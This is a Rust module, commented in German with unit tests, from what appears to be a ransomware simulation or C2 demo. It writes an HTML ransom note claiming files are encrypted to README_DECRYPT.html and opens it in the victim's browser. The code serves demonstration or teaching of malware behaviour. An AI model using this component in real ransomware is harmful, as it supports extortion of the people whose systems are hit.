use anyhow::{Context, Result};
use std::fs;
use std::path::Path;

/// Gibt den HTML-Inhalt für die Ransom-Note zurück
/// Ausgelagert, um den Inhalt isoliert zu testen oder zu ändern
fn get_ransom_html_content() -> &'static str {
    r#"
    <!doctype html>
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <style>
                body { background-color: #8b0000; color: white; font-family: 'courier new', monospace; text-align: center; padding: 50px; }
                .container { border: 3px solid white; padding: 20px; background-color: black; max-width: 800px; margin: 0 auto; }
                h1 { color: red; text-transform: uppercase; font-size: 3em; }
                p { font-size: 1.2em; }
                .button {
                    background-color: red; color: white; border: 2px solid white; 
                    padding: 15px 32px; text-align: center; text-decoration: none; 
                    display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;
                    font-weight: bold;
                }
                .button:hover { background-color: white; color: red; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ your files are encrypted ⚠️</h1>
                <p>don't panic. this is a simulation.</p>
                <p>all your documents, photos, and databases have been encrypted with strong military-grade encryption.</p>
                <br>
                <p>to restore your files, you need the unique private key that we have generated for you.</p>
                
                <hr>
                <h3>how to decrypt?</h3>
                <p>since this is a c2-demo, you cannot decrypt directly from the browser.</p>
                <p><b>please contact the operator (c2 server) and send the command:</b></p>
                <h2>decrypt</h2>
                
                <!-- visueller button -->
                <button class="button" onclick="alert('please send the command \'decrypt\' in your c2 console to trigger the rust process!')">
                    decrypt files now
                </button>
            </div>
        </body>
    </html>
    "#
}

/// Schreibt die Ransom-note auf die Festplatte
/// Funktion macht nur I/O
pub fn write_ransom_note(base_path: &Path) -> Result<std::path::PathBuf> {
    let note_path = base_path.join("README_DECRYPT.html");

    // Inhalt der Ransom-Note abrufen
    let content = get_ransom_html_content();

    fs::write(&note_path, content)
        .with_context(|| format!("Konnte Ransom-Note nicht schreiben (Path: {:?}", note_path))?;

    Ok(note_path)
}

/// versucht die Datei im Standard-Browser zu öffnen.
/// Diese Funktion ignoriert Fehler bewusst (Best Effort), dass die eigentliche Malware nicht
/// abstürzt, nur weil kein browser installiert ist
pub fn open_ransom_note_in_browser(note_path: &Path) {
    // Versuch die Datei zu öffnen
    #[cfg(target_os = "linux")]
    let _ = std::process::Command::new("xdg-open")
        .arg(&note_path)
        .status();
    #[cfg(target_os = "windows")]
    let _ = std::process::Command::new("cmd")
        .args(["/C", "start", "", &note_path.to_string_lossy()])
        .status();
    #[cfg(target_os = "macos")]
    let _ = std::process::Command::new("open").arg(&note_path).status();
}

/// hauptfunktion: Erstellt Note und öffnet sie
pub fn create_and_show_ransom_note(base_path: &Path) -> Result<()> {
    // Schreiben
    let note_path = write_ransom_note(base_path)?;

    // Öffnen
    #[cfg(not(test))]
    open_ransom_note_in_browser(&note_path);

    Ok(())
}

// Tests
#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use std::fs;

    // Hilfsfunktion: Erstellt einen temporären Ordner für Tests
    fn get_temp_dir() -> std::path::PathBuf {
        let mut dir = env::temp_dir();
        dir.push("rust_malware_test_extortion");
        // Versuchen zu erstellen, Fehler ignorieren wenn schon da
        let _ = fs::create_dir(&dir);
        dir
    }

    // Testen, ob der HTML-Inhalt stimmt
    #[test]
    fn test_html_content_integrity() {
        let html = get_ransom_html_content();
        assert!(
            html.contains("your files are encrypted"),
            "HTML Titel fehlt"
        );
        assert!(
            html.contains("background-color: #8b0000"),
            "CSS Styling fehlt"
        );
        assert!(html.contains("decrypt files now"), "Button Text fehlt");
    }

    // Testen ob die Datei korrekt erstellt wird
    #[test]
    fn test_file_creation() {
        let temp_dir = get_temp_dir();

        let result = write_ransom_note(&temp_dir);
        assert!(result.is_ok(), "Funktion sollte erfolgreich durchlaufen");

        let file_path = result.unwrap();
        assert!(
            file_path.exists(),
            "Datei wurde nicht physikalisch erstellt"
        );
        assert!(
            file_path.ends_with("README_DECRYPT.html"),
            "Dateiname ist falsch"
        );

        // Aufräumen (Datei löschen)
        let _ = fs::remove_file(file_path);
    }

    // Testen, ob der Dateiinhalt korrekt geschrieben wurde
    #[test]
    fn test_file_content_match() {
        let temp_dir = get_temp_dir();
        let file_path = write_ransom_note(&temp_dir).expect("Schreiben fehlgeschlagen");

        // Datei wieder einlesen
        let content_on_disk = fs::read_to_string(&file_path).expect("Lesen fehlgeschlagen");
        let expected_content = get_ransom_html_content();

        assert_eq!(
            content_on_disk, expected_content,
            "Gespeicherter Inhalt stimmt nicht mit Vorlage überein"
        );

        let _ = fs::remove_file(file_path);
    }

    // Fehlerbehandlung bei ungülgtigem Pfad testen
    #[test]
    fn test_write_permission_error() {
        // Wir versuchen in einen Pfad zu schreiben, der hoffentlich nicht existiert oder root gehört
        // Unter Linux ist /root oft gesperrt, unter Windows ist es schwieriger einen garantiert gesperrten Pfad zu finden.
        // Ein nicht existierendes Verzeichnis als Base sollte reichen, wenn fs::write das Verzeichnis erwartet.

        let invalid_path = Path::new("/pfad/der/ganz/sicher/nicht/existiert/xyz123");

        // Die Funktion nutzt fs::write, was fehlschlägt, wenn der Ordner nicht da ist.
        let result = write_ransom_note(invalid_path);

        assert!(
            result.is_err(),
            "Schreiben in nicht-existenten Ordner sollte fehlschlagen"
        );

        // Prüfen, ob der Fehlerkontext stimmt (anyhow context)
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains("Konnte Ransom-Note nicht schreiben"),
            "Falsche Fehlermeldung: {}",
            err_msg
        );
    }
}
